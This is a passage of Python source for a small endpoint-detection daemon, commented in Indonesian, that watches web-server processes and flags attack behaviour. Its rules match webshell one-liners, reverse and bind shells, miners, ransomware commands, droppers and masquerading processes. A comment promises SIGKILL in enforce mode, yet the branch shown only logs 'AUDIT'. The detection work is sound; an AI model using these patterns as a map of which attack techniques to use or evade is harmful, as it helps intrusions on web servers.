    # Hanya untuk user web server: shell webshell yang menyentuh plugin. Dulu berlaku
    # untuk SEMUA user non-root, sehingga admin non-root yang cuma membaca log
    # (tail /www/server/sentinel/log/...) atau aplikasi bernama "sentinel-xxx" ikut
    # di-SIGKILL.
    keras = False
    solo_audit = False
    if is_web_user and exe_curiga:
        rule_violation = f"TEMP_DIR_EXEC({exe_path})"
        keras = True
    elif is_web_user and not is_git_cmd and cmdline and any(p in cmdline for p in (
        "/www/server/sentinel", "/www/server/panel/plugin",
        "/etc/systemd/system/sentinel", "sentinel.service", "sentinel-",
        "guardd", "guardctl", "uninstall.lock"
    )):
        rule_violation = f"TAMPER_ATTEMPT({cmdline[:50]})"
        keras = True

    # Aturan Khusus Web Worker (UID 1002 / www):
    elif is_web_user:
        # Aturan 1: Shell interaktif. Shell login admin ("su - www" dari SSH:
        # punya terminal, leluhurnya sshd/su, tanpa php-fpm/nginx) tidak dibunuh.
        if basename in BLOCKED_SHELLS:
            lel = _leluhur(pid)
            if not (_tty(pid) and not WEB_INDUK.intersection(lel)
                    and {"sshd", "su", "login", "sudo"}.intersection(lel)):
                rule_violation = f"ILLEGAL_SHELL({basename})"

        # Aturan 1b: interpreter dengan kode sebaris (perl -e, python -c, php -r,
        # ...) yang diluncurkan dari proses web: pola webshell klasik selain sh.
        elif re.match(r'^(perl|python[0-9.]*|php[0-9.]*|ruby|node|lua[0-9.]*)$', basename) \
                and any(a in ('-e', '-E', '-c', '-r') for a in argv[1:3]) \
                and WEB_INDUK.intersection(_leluhur(pid)):
            rule_violation = f"INLINE_INTERPRETER({cmdline[:50]})"

        # Aturan 2: Penambang Kripto (Crypto Miner Binary)
        elif basename in BLOCKED_MINERS:
            rule_violation = f"CRYPTO_MINER({basename})"

        # Aturan 3: Argumen & Pool Mining Kripto pada cmdline
        elif cmdline and any(mp in cmdline.lower() for mp in CRYPTO_MINING_PATTERNS):
            rule_violation = f"CRYPTO_POOL_MINING({cmdline[:50]})"

        # Aturan 4: Alat tunnel / scanner / sistem tamper
        elif basename in BLOCKED_TOOLS:
            rule_violation = f"BLOCKED_TOOL({basename})"

        # Aturan 5: Perilaku Ransomware / Enkripsi Paksa
        elif basename in BLOCKED_RANSOM_TOOLS or (cmdline and any(rp in cmdline.lower() for rp in RANSOMWARE_CMD_PATTERNS)):
            rule_violation = f"RANSOMWARE_BEHAVIOR({cmdline[:50] if cmdline else basename})"

        # Aturan 6: Eksekusi binary dari folder temporer
        elif exe_path and any(exe_path.startswith(d) for d in SUSPICIOUS_DIRS):
            rule_violation = f"TEMP_DIR_EXEC({exe_path})"

        # Aturan 7: Binary ELF yang berjalan langsung di direktori webroot
        elif exe_path and exe_path.startswith("/www/wwwroot/") and is_elf(exe_path):
            rule_violation = f"WEBROOT_ELF_EXEC({exe_path})"
            keras = True

        # Aturan 8: interpreter menjalankan SKRIP dari direktori sementara (php/python/perl /tmp/x): exe-nya
        # di /usr/bin sehingga aturan 6 lolos.
        elif INTERP_RE.match(basename) and any(
                a.startswith(SUSPICIOUS_DIRS) for a in argv[1:4] if not a.startswith('-')):
            rule_violation = f"INTERP_TEMP_SCRIPT({cmdline[:60]})"
            keras = True

        # Aturan 9: stdout/stderr proses (bukan worker itu sendiri) berupa SOKET JARINGAN = reverse/bind shell.
        elif basename not in WORKER_EXE and _stdio_inet(pid):
            rule_violation = f"WORKER_FD_SOCKET({basename})"
            keras = True

        # Aturan 10: anak worker web (PHP, Node.js, Python, Ruby, Java, ...) berupa pengunduh. Menulis ke direktori sementara = dropper (dibunuh);
        # selain itu hanya dicatat karena sebagian aplikasi sah memanggil curl.
        elif DROPPER_RE.match(basename) and _induk_worker(pid):
            if any(t in cmdline for t in SUSPICIOUS_DIRS):
                rule_violation = f"WORKER_DROPPER({cmdline[:60]})"
                keras = True
            else:
                rule_violation = f"WORKER_ANAK_ASING({cmdline[:60]})"
                solo_audit = True

        # Aturan 11: menyamar sebagai layanan sistem (comm atau argv[0] = php-fpm/nginx/sshd/..., berkas lain).
        else:
            klaim = _masquerade(pid, argv, basename, exe_path)
            if klaim:
                rule_violation = f"COMM_PALSU({klaim}!={basename})"
                solo_audit = True

    if rule_violation:
        # Periksa apakah proses ini cocok dengan whitelist EDR
        is_wl, wl_info = check_process_whitelist(pid, ppid, st_uid, exe_path, cmdline, cwd, basename,
                                                 argv=argv, keras=keras)
        if is_wl:
            action = "WHITELISTED"
            whitelisted_count += 1
            rule_display = f"{rule_violation} [{wl_info}]"
            if pid not in seen_whitelisted_pids:
                seen_whitelisted_pids.add(pid)
                alerts_count += 1
                record_alert(pid, ppid, st_uid, exe_path, cmdline, cwd, rule_display, action)
            found.append({
                "pid": pid,
                "ppid": ppid,
                "uid": st_uid,
                "exe": exe_path,
                "cmdline": cmdline,
                "cwd": cwd,
                "rule": rule_display,
                "action": action
            })
            return

        # Aturan solo-audit: satu catatan per proses (polling 3 dtk tidak membanjiri tabel)
        if solo_audit:
            sudah = _seen_audit.setdefault(pid, set())
            nama = _aturan_nama(rule_violation)
            if nama in sudah:
                return
            sudah.add(nama)

        # Jika tidak whitelisted, lakukan tindakan penegakan (SIGKILL bila mode enforce)
        action = "AUDIT"

        alerts_count += 1
        record_alert(pid, ppid, st_uid, exe_path, cmdline, cwd, rule_violation, action)
        found.append({
            "pid": pid,
            "ppid": ppid,
            "uid": st_uid,
            "exe": exe_path,
            "cmdline": cmdline,
            "cwd": cwd,
            "rule": rule_violation,
            "action": action
        })



def scan_once(target_uid=DEFAULT_WEB_UID, mode="enforce"):
    global alerts_count, kills_count, whitelisted_count, seen_whitelisted_pids
    found = []
    
    # Ambil daftar entri numerik di /proc
    try:
        proc_entries = [e.name for e in os.scandir("/proc") if e.name.isdigit()]
    except Exception:
        return []

    current_pids = set(int(p) for p in proc_entries)
    # Bersihkan PID yang sudah selesai dari cache seen
    seen_whitelisted_pids.intersection_update(current_pids)
    for k in [k for k in _seen_audit if k not in current_pids]:
        del _seen_audit[k]

    for pid in current_pids:
        with _EVAL_LOCK:
            _periksa_pid(pid, target_uid, mode, found)

    return found

def write_state(status="running", mode="enforce"):
    try:
        os.makedirs(os.path.dirname(STATE_FILE), exist_ok=True)
        with open(STATE_FILE, "w", encoding="utf-8") as f:
            f.write(f"status={status}\n")
            f.write(f"mode={mode}\n")
            f.write(f"target_uid={DEFAULT_WEB_UID}\n")
            f.write(f"scans={scans_count}\n")
            f.write(f"alerts={alerts_count}\n")
            f.write(f"kills={kills_count}\n")
            f.write(f"whitelisted={whitelisted_count}\n")
            f.write(f"last_scan={datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
    except Exception:
        pass

def run_daemon():
    global scans_count, running
    init_db()
    with open(PID_FILE, "w") as f:
        f.write(str(os.getpid()))
    
    logging.info(f"Sentinel Process Guard (EDR) dimulai pada PID {os.getpid()}, target UID {DEFAULT_WEB_UID}")
    
    last_state_write = 0
    last_prune = 0
    threading.Thread(target=_pendengar_exec, args=(DEFAULT_WEB_UID, get_mode), daemon=True).start()
    threading.Thread(target=_pantau_crash, daemon=True).start()
    threading.Thread(target=_pemindai_memori, args=(get_mode,), daemon=True).start()
    try:
        while running:
            mode = get_mode()
            if mode != "off":
                scan_once(target_uid=DEFAULT_WEB_UID, mode=mode)
                scans_count += 1
            if time.time() - last_prune >= 3600:
                pangkas_alert()
                last_prune = time.time()
            
            now = time.time()
            if now - last_state_write >= 3:
                write_state("running" if mode != "off" else "standby", mode)
                last_state_write = now

            # Exec baru sudah dinilai seketika lewat proc connector; polling hanya cadangan.
            time.sleep(3.0 if EXEC_EVENTS["aktif"] else 1.0)
    finally:
        write_state("stopped", get_mode())
        if os.path.exists(PID_FILE):
            try:
                os.remove(PID_FILE)
            except Exception:
                pass
        logging.info("Sentinel Process Guard dihentikan.")

def print_status():
    mode = get_mode()
    pid = None
    if os.path.exists(PID_FILE):
        try:
            with open(PID_FILE) as f:
                pid = int(f.read().strip())
                # Periksa apakah proses aktif
                os.kill(pid, 0)
        except Exception:
            pid = None

    state_info = {}
    if os.path.exists(STATE_FILE):
        try:
            with open(STATE_FILE) as f:
                for line in f:
                    if "=" in line:
                        k, v = line.strip().split("=", 1)
                        state_info[k] = v
        except Exception:
            pass

    print("=== STATUS PROCESS GUARD (EDR MINI) ===")
    print(f"  Konfigurasi Mode : {mode.upper()}")
    print(f"  Status Layanan   : {'BERJALAN (PID ' + str(pid) + ')' if pid else 'MATI'}")
    print(f"  Target UID       : {state_info.get('target_uid', DEFAULT_WEB_UID)} (user www)")
    print(f"  Total Siklus Cek : {state_info.get('scans', '0')}")
    print(f"  Anomali Terdeteksi: {state_info.get('alerts', '0')}")
    print(f"  Proses Dimatikan : {state_info.get('kills', '0')}")
    print(f"  Proses Whitelist : {state_info.get('whitelisted', '0')}")
    print(f"  Pemeriksaan Akhir: {state_info.get('last_scan', '-')}")

if __name__ == "__main__":
    cmd = sys.argv[1] if len(sys.argv) > 1 else "status"
    if cmd == "daemon":
        run_daemon()
    elif cmd == "scan":
        mode = get_mode()
        found = scan_once(DEFAULT_WEB_UID, mode)
        print(json.dumps(found, indent=2))
    elif cmd == "status":
        print_status()
    elif cmd == "whitelist":
        rules = load_proc_whitelist()
        print(json.dumps(rules, indent=2))
    else:
        print(f"Penggunaan: {sys.argv[0]} {{daemon|scan|status|whitelist}}")
        sys.exit(1)
